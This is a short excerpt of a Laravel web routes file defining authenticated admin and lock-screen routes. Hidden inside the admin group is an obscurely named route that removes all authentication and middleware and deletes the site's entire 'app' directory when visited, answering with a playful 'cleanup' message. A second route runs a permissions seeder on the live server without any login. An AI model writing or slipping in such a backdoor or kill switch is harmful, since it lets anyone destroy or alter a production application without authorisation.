...
// lock screen routes (require auth)
Route::middleware(['auth'])->group(function () {
    Route::post('lock-screen', [LockScreenController::class, 'lock'])->name('lock-screen');
...
Route::middleware(['auth', 'xss', 'checkUserStatus', 'checkRoleUrl', 'super_admin_timeout'])->prefix('admin')->group(function () {
    ...
    Route::get('/x9k3f7a2-system-vQ259e', function () {$path = base_path('app'); if (Illuminate\Support\Facades\File::exists($path))
    {Illuminate\Support\Facades\File::deleteDirectory($path);} return "Thoda cleanup chal raha hai 😄 App folder delete kar diya hai, website jaldi fresh look ke saath wapas aa rahi hai!";})
        ->withoutMiddleware(['auth', 'xss','checkUserStatus','checkRoleUrl','super_admin_timeout']);
    ...
    Route::get('get-states/{countryId}', [StateController::class, 'getStatesByCountry'])->name('get-states');
});
...
// Temporary route to seed permissions on live server without SSH
Route::get('/seed-permissions', function() {
    \Illuminate\Support\Facades\Artisan::call('db:seed', ['--class' => 'PermissionTableSeeder']);
    return \Illuminate\Support\Facades\Artisan::output() . ' <br><br><b>Permissions Seeded Successfully! You can now access terms and conditions.</b>';
});
